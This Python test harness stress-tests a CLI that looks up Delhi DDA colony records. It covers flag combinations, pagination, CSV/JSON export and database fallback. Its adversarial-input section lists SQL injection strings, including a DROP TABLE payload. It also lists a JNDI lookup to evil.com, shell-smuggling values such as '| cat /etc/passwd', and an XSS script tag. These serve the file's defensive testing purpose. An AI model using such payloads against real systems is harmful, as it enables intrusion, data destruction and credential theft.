#!/usr/bin/env python3
"""
Comprehensive Adversarial Stress Harness for DDA Delhi Colonies CLI (dda_lookup.py)
----------------------------------------------------------------------------------
Tests CLI argument combinations, injection attacks, unicode, boundary values,
export parsing & validation, database fallback resilience, and error handling.
"""

import csv
import json
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
CLI_PATH = PROJECT_ROOT / "dda_lookup.py"
DATA_DIR = PROJECT_ROOT / "data"

passed = 0
failed = 0
findings = []


def log_test(name: str, status: bool, detail: str = ""):
    global passed, failed
    if status:
        passed += 1
        print(f"  [PASS] {name}" + (f" ({detail})" if detail else ""))
    else:
        failed += 1
        findings.append(f"FAIL: {name} -> {detail}")
        print(f"  [FAIL] {name}: {detail}")


def run_cli(args: list[str], cwd: Path = PROJECT_ROOT, env: dict = None) -> tuple[int, str, str]:
    """Execute dda_lookup.py with args and capture returncode, stdout, stderr."""
    cmd = [sys.executable, str(CLI_PATH)] + args
    merged_env = os.environ.copy()
    if env:
        merged_env.update(env)
    proc = subprocess.run(
        cmd,
        cwd=cwd,
        env=merged_env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        encoding="utf-8",
        errors="replace"
    )
    return proc.returncode, proc.stdout, proc.stderr


print("=" * 80)
print("DDA CLI ADVERSARIAL STRESS TEST HARNESS")
print(f"CLI Path: {CLI_PATH}")
print(f"Project Root: {PROJECT_ROOT}")
print("=" * 80)

# =============================================================================
# SECTION 1: Argument Combinations & Filtering Stress-Testing
# =============================================================================
print("\n[SECTION 1: Argument Combinations & Filtering]")

# 1.1 Combinations of search, category, boundary, limit, offset, format
code, out, err = run_cli(["-s", "Vihar", "-c", "regular", "-b", "yes", "-l", "5", "--offset", "2", "-f", "json"])
log_test("Comb 1: search+cat+boundary+limit+offset JSON", code == 0 and len(json.loads(out)) <= 5 and all(r["category"] == "regular" and r["boundary_delineated"] for r in json.loads(out)))

code, out, err = run_cli(["-s", "Sainik", "-c", "affluent", "-b", "no", "-f", "json"])
if code == 0:
    records = json.loads(out)
    log_test("Comb 2: search+affluent+boundary_no JSON", all(r["category"] == "affluent" and not r["boundary_delineated"] for r in records))
else:
    log_test("Comb 2: search+affluent+boundary_no JSON", False, f"Exit code {code}: {err}")

# 1.2 Boundary shortcut flag with category
code, out, err = run_cli(["--delineated", "-c", "regular", "-l", "10", "-f", "json"])
log_test("Comb 3: --delineated shortcut + category regular", code == 0 and len(json.loads(out)) == 10 and all(r["boundary_delineated"] for r in json.loads(out)))

# 1.3 Conflicting flags (--boundary no vs --delineated)
code, out, err = run_cli(["-b", "no", "--delineated", "-l", "5", "-f", "json"])
log_test("Comb 4: Conflicting boundary flags resolution", code == 0 and all(r["boundary_delineated"] for r in json.loads(out)))

# 1.4 Category case insensitivity & prefix handling ('aff', 'AFFLUENT', 'reg', 'REGULAR', 'all')
for cat_arg in ["affluent", "AFFLUENT", "Aff", "aff", "regular", "REGULAR", "Reg", "reg", "all"]:
    code, out, err = run_cli(["-c", cat_arg, "-l", "5", "-f", "json"])
    log_test(f"Comb 5: Category variant '{cat_arg}'", code == 0 and len(json.loads(out)) > 0, f"Returned {len(json.loads(out)) if code == 0 else 0} items")

# 1.5 Boundary boolean aliases ('1', '0', 'yes', 'no', 'true', 'false', 'y', 'n', 'delineated', 'undelineated')
for b_arg in ["1", "0", "yes", "no", "true", "false", "y", "n", "delineated", "undelineated"]:
    code, out, err = run_cli(["-b", b_arg, "-l", "5", "-f", "json"])
    expected_bool = b_arg in ["1", "yes", "true", "y", "delineated"]
    log_test(f"Comb 6: Boundary alias '{b_arg}'", code == 0 and all(r["boundary_delineated"] == expected_bool for r in json.loads(out)))

# 1.6 Pagination edge cases (limit=0, negative limit, offset > total, huge offset)
code, out, err = run_cli(["-l", "0", "-f", "json"])
log_test("Pagination: limit=0", code == 0 and len(json.loads(out)) == 0)

code, out, err = run_cli(["--offset", "1795", "-f", "json"])
log_test("Pagination: offset=1795", code == 0 and len(json.loads(out)) == 5)

code, out, err = run_cli(["--offset", "9999", "-f", "json"])
log_test("Pagination: offset beyond max (9999)", code == 0 and len(json.loads(out)) == 0)

# 1.7 Direct lookup flags (--id, -r, -m, -i)
code, out, err = run_cli(["--id", "1", "-f", "json"])
log_test("Direct ID: --id 1", code == 0 and json.loads(out)["colony_id"] == 1)

code, out, err = run_cli(["--id", "1800", "-f", "json"])
log_test("Direct ID: --id 1800", code == 0 and json.loads(out)["colony_id"] == 1800)

code, out, err = run_cli(["-r", "1246-A", "-f", "json"])
log_test("Direct Reg: -r 1246-A", code == 0 and len(json.loads(out)) >= 1)

code, out, err = run_cli(["-m", "111", "-f", "json"])
log_test("Direct Map: -m 111", code == 0 and len(json.loads(out)) >= 1)

# 1.8 Info lookup priority and cards
code, out, err = run_cli(["-i", "1", "--no-color"])
log_test("Info Card: ID 1 plain text", code == 0 and "COLONY INSPECTION CARD" in out and "Sainik Farms" in out)

code, out, err = run_cli(["-i", "Neb Sarai", "--no-color"])
log_test("Info Card: Name lookup", code == 0 and "COLONY INSPECTION CARD" in out and "Neb Sarai" in out)

# =============================================================================
# SECTION 2: Adversarial Inputs, Special Characters & SQL Injection Resilience
# =============================================================================
print("\n[SECTION 2: Adversarial Inputs & SQL Injection Resilience]")

injections = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "'; DROP TABLE colonies; --",
    "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 --",
    "\" OR \"\"=\"",
    "admin'--",
    "' OR name LIKE '%",
    "\\x00' OR 1=1 --",
    "'; VACUUM; --",
]

for inj in injections:
    code, out, err = run_cli(["-s", inj, "-f", "json"])
    is_safe = (code == 0) and (out.strip() == "[]" or len(json.loads(out)) < 10)
    log_test(f"SQL Injection: {inj[:30]}", is_safe, f"Safe exit code {code}, count: {len(json.loads(out)) if code==0 else 'err'}")

# Special characters & SQL wildcards
special_chars = [
    "%",
    "%%%",
    "_",
    "___",
    "?",
    "*",
    "\\",
    "\"\"\"",
    "''''",
    "<script>alert(1)</script>",
    "${jndi:ldap://evil.com/x}",
    "$(whoami)",
    "`whoami`",
    "& echo hacked",
    "; ls -la",
    "| cat /etc/passwd"
]

for sc in special_chars:
    code, out, err = run_cli(["-s", sc, "-f", "json"])
    log_test(f"Special Chars: {sc[:25]}", code == 0, f"Exit code {code}")

# Unicode, Hindi script, emojis, zero-width chars
unicode_inputs = [
    "सैनिक फार्म्स",  # Hindi Devnagari
    "संगम विहार",
    "मुकुंदपुर",
    "東京",  # Japanese
    "القاهرة",  # Arabic
    "Москва",  # Cyrillic
    "🏡 🏙️ 📍 🗺️",  # Emojis
    "Sainik\u200bFarms",  # Zero-width space
    "Sainik\tFarms",  # Tab
    "Sainik\nFarms",  # Newline
]

for uc in unicode_inputs:
    code, out, err = run_cli(["-s", uc, "-f", "json"])
    log_test(f"Unicode string: {repr(uc)}", code == 0, f"Exit code {code}")

# Very long strings (Buffer overflow / memory stress)
for length in [100, 1000, 10000]:
    long_query = "A" * length
    code, out, err = run_cli(["-s", long_query, "-f", "json"])
    log_test(f"Long query: {length} chars", code == 0 and out.strip() == "[]", f"Exit code {code}")

# Non-existent IDs and invalid categories
non_existent_ids = ["-1", "0", "1801", "99999999"]
for nid in non_existent_ids:
    code, out, err = run_cli(["-i", nid])
    log_test(f"Non-existent ID: {nid}", code == 0, f"Exit code {code}")

# Invalid category filter
code, out, err = run_cli(["-c", "non_existent_category_xyz", "-f", "json"])
log_test("Invalid category choice", code == 0 and out.strip() == "[]")

# Fuzzy suggestions on misspelled queries
code, out, err = run_cli(["-s", "Sanik Famrs", "--no-color"])
log_test("Fuzzy suggestion trigger", code == 0 and ("Did you mean" in out or "Sainik" in out or "No colonies found" in out))


# =============================================================================
# SECTION 3: Export Stress-Testing (CSV & JSON Round-Trip Re-parsing)
# =============================================================================
print("\n[SECTION 3: Export Generation & Validation]")

with tempfile.TemporaryDirectory() as tmpdir:
    tmp_path = Path(tmpdir)

    # 3.1 Export all 1800 records to CSV
    csv_all = tmp_path / "all_colonies.csv"
    code, out, err = run_cli(["-o", str(csv_all)])
    if code == 0 and csv_all.exists():
        with open(csv_all, "r", encoding="utf-8") as f:
            reader = list(csv.DictReader(f))
        log_test("Export all 1800 to CSV", len(reader) == 1800 and reader[0]["name"] != "", f"Count: {len(reader)}")
    else:
        log_test("Export all 1800 to CSV", False, f"Code {code}, err: {err}")

    # 3.2 Export all 1800 records to JSON
    json_all = tmp_path / "all_colonies.json"
    code, out, err = run_cli(["-o", str(json_all)])
    if code == 0 and json_all.exists():
        with open(json_all, "r", encoding="utf-8") as f:
            data = json.load(f)
        log_test("Export all 1800 to JSON", isinstance(data, list) and len(data) == 1800 and data[0]["colony_id"] == 1, f"Count: {len(data)}")
    else:
        log_test("Export all 1800 to JSON", False, f"Code {code}, err: {err}")

    # 3.3 Export 69 Affluent colonies to JSON and CSV
    json_aff = tmp_path / "affluent.json"
    code, out, err = run_cli(["-c", "affluent", "-o", str(json_aff)])
    with open(json_aff, "r", encoding="utf-8") as f:
        data_aff = json.load(f)
    log_test("Export Affluent to JSON (69 items)", len(data_aff) == 69 and all(r["category"] == "affluent" for r in data_aff))

    csv_aff = tmp_path / "affluent.csv"
    code, out, err = run_cli(["-c", "affluent", "-o", str(csv_aff)])
    with open(csv_aff, "r", encoding="utf-8") as f:
        data_aff_csv = list(csv.DictReader(f))
    log_test("Export Affluent to CSV (69 items)", len(data_aff_csv) == 69 and all(r["category"] == "affluent" for r in data_aff_csv))

    # 3.4 Export 1731 Regular colonies to JSON and CSV
    json_reg = tmp_path / "regular.json"
    code, out, err = run_cli(["-c", "regular", "-o", str(json_reg)])
    with open(json_reg, "r", encoding="utf-8") as f:
        data_reg = json.load(f)
    log_test("Export Regular to JSON (1,731 items)", len(data_reg) == 1731 and all(r["category"] == "regular" for r in data_reg))

    # 3.5 Export empty result set
    json_empty = tmp_path / "empty.json"
    code, out, err = run_cli(["-s", "NonExistentTermXYZ999", "-o", str(json_empty)])
    with open(json_empty, "r", encoding="utf-8") as f:
        data_empty = json.load(f)
    log_test("Export empty result set to JSON", len(data_empty) == 0)

    # 3.6 Deep nested path auto-creation (mkdir parents)
    nested_csv = tmp_path / "nested" / "subfolder" / "deep" / "exported.csv"
    code, out, err = run_cli(["-s", "Sainik", "-o", str(nested_csv)])
    log_test("Export to deep nested non-existent directory", code == 0 and nested_csv.exists())

    # 3.7 Non-writable or invalid export path error handling
    invalid_export = Path("/non_existent_root_dir_abc_123/unwritable.csv")
    code, out, err = run_cli(["-o", str(invalid_export)])
    log_test("Export to unwritable path exits with code 1 gracefully", code == 1 and "Export Error" in err)


# =============================================================================
# SECTION 4: Dual-Backend & Fallback Robustness
# =============================================================================
print("\n[SECTION 4: Dual-Backend & Fallback Robustness]")

with tempfile.TemporaryDirectory() as tmpdir:
    sandbox_dir = Path(tmpdir)
    sandbox_data = sandbox_dir / "data"
    sandbox_data.mkdir(parents=True)

    # Copy files
    shutil.copy(DATA_DIR / "colonies.db", sandbox_data / "colonies.db")
    shutil.copy(DATA_DIR / "colonies.json", sandbox_data / "colonies.json")
    shutil.copy(DATA_DIR / "colonies.csv", sandbox_data / "colonies.csv")

    # 4.1 Primary SQLite Backend
    code, out, err = run_cli(["--data-dir", str(sandbox_data), "--stats", "-f", "json"])
    stats1 = json.loads(out) if code == 0 else {}
    log_test("Backend 1: Primary SQLite DB loaded", stats1.get("backend") == "SQLite Database" and stats1.get("total_colonies") == 1800)

    # 4.2 Rename SQLite DB -> Fallback to JSON
    (sandbox_data / "colonies.db").rename(sandbox_data / "colonies.db.bak")
    code, out, err = run_cli(["--data-dir", str(sandbox_data), "--stats", "-f", "json"])
    stats2 = json.loads(out) if code == 0 else {}
    log_test("Backend 2: Fallback to colonies.json when DB missing", "colonies.json" in str(stats2.get("backend")) and stats2.get("total_colonies") == 1800)

    # Verify querying on JSON in-memory backend
    code, out, err = run_cli(["--data-dir", str(sandbox_data), "-s", "Sainik", "-f", "json"])
    records_json_backend = json.loads(out) if code == 0 else []
    log_test("Backend 2: Querying via JSON in-memory backend", len(records_json_backend) > 0 and all("sainik" in r["name"].lower() for r in records_json_backend))

    # 4.3 Rename JSON -> Fallback to CSV
    (sandbox_data / "colonies.json").rename(sandbox_data / "colonies.json.bak")
    code, out, err = run_cli(["--data-dir", str(sandbox_data), "--stats", "-f", "json"])
    stats3 = json.loads(out) if code == 0 else {}
    log_test("Backend 3: Fallback to colonies.csv when DB & JSON missing", "colonies.csv" in str(stats3.get("backend")) and stats3.get("total_colonies") == 1800)

    # Verify querying on CSV in-memory backend
    code, out, err = run_cli(["--data-dir", str(sandbox_data), "-c", "affluent", "-f", "json"])
    records_csv_backend = json.loads(out) if code == 0 else []
    log_test("Backend 3: Querying via CSV in-memory backend (69 affluent)", len(records_csv_backend) == 69)

    # 4.4 Rename CSV -> All missing -> Graceful Error Exit
    (sandbox_data / "colonies.csv").rename(sandbox_data / "colonies.csv.bak")
    code, out, err = run_cli(["--data-dir", str(sandbox_data), "--stats"])
    log_test("Backend 4: All datasets missing exits with code 1 & error message", code == 1 and ("No valid colony dataset" in err or "Unable to locate" in err))

    # 4.5 Direct --db-path to specific DB
    (sandbox_data / "colonies.db.bak").rename(sandbox_data / "custom_test.db")
    code, out, err = run_cli(["--db-path", str(sandbox_data / "custom_test.db"), "--stats", "-f", "json"])
    stats_custom = json.loads(out) if code == 0 else {}
    log_test("Backend 5: Explicit --db-path direct connection", stats_custom.get("total_colonies") == 1800)

    # 4.6 Explicit non-existent --db-path
    code, out, err = run_cli(["--db-path", str(sandbox_data / "does_not_exist.db")])
    log_test("Backend 6: Non-existent --db-path exits code 1", code == 1 and "Specified database file does not exist" in err)

    # 4.7 Corrupted SQLite file -> should handle error
    corrupt_db = sandbox_data / "corrupt.db"
    with open(corrupt_db, "wb") as f:
        f.write(b"NOT A VALID SQLITE DATABASE FILE GARBAGE DATA 1234567890\n" * 100)
    code, out, err = run_cli(["--db-path", str(corrupt_db)])
    log_test("Backend 7: Corrupted SQLite DB handled with code 1", code == 1 and "Database Initialization Error" in err)


# =============================================================================
# SECTION 5: Output Formats, ANSI Rendering & Hyperlinks
# =============================================================================
print("\n[SECTION 5: Output Formats & ANSI Rendering]")

# 5.1 Format: table, csv, plain, json
for fmt in ["table", "csv", "plain", "json"]:
    code, out, err = run_cli(["-s", "Sainik", "-f", fmt])
    log_test(f"Output Format: {fmt}", code == 0 and len(out.strip()) > 0)

# 5.2 ANSI Color toggles
code, out_no_color, err = run_cli(["-s", "Sainik", "--no-color", "-f", "table"])
log_test("Color mode: --no-color strips ANSI escape codes", "\033[" not in out_no_color)

code, out_color, err = run_cli(["-s", "Sainik", "--color", "-f", "table"])
log_test("Color mode: --color forces ANSI escape codes", "\033[" in out_color)

# 5.3 Default zero-argument execution displays stats + sample table
code, out_default, err = run_cli([])
log_test("Default Zero-Arg Execution (Stats + Sample Table)", code == 0 and "DATASET STATISTICS" in out_default and "Sample Colony Records" in out_default)

# 5.4 Stats formatting in JSON
code, out_stats_json, err = run_cli(["--stats", "-f", "json"])
stats_json = json.loads(out_stats_json) if code == 0 else {}
log_test("Stats JSON format", stats_json.get("total_colonies") == 1800 and stats_json.get("affluent_colonies") == 69 and stats_json.get("regular_unauthorized_colonies") == 1731)


print("\n" + "=" * 80)
print(f"STRESS TEST SUMMARY: {passed} PASSED, {failed} FAILED")
print("=" * 80)

if failed > 0:
    print("\nFAILURES:")
    for f in findings:
        print(f"  - {f}")
    sys.exit(1)
else:
    print("\nALL ADVERSARIAL STRESS TESTS PASSED EMPIRICALLY!")
    sys.exit(0)
